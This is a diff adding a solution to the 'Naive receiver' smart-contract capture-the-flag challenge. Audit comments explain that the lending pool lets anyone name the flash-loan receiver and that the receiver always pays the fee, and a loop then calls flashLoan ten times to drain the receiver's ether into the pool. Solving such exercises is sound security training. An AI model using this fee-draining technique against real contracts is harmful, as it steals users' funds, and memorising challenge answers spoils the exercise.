@@ -38,6 +38,21 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // @audit NaiveReceiverLenderPool.flashLoan() doesn't use msg.sender
+        // but allows arbitrary receiver to be passed in.
+        // 
+        // FlashLoanReceiver.onFlashLoan() doesn't check that it was able
+        // to make a profit using the flash loan, but always repays the
+        // loan amount + fee - even if it was "loaned" 0 eth!
+        //
+        // hence call NaiveReceiverLenderPool.flashLoan() 10 times with
+        // address(FlashLoanReceiver) to drain balance into pool via fees
+
+        const ETH = await pool.ETH();
+        await pool.connect(player);
+        for(i=0; i<10; i++) {
+            await pool.flashLoan(receiver.address, ETH, 0, "0x");
+        }
     });
 
     after(async function () {
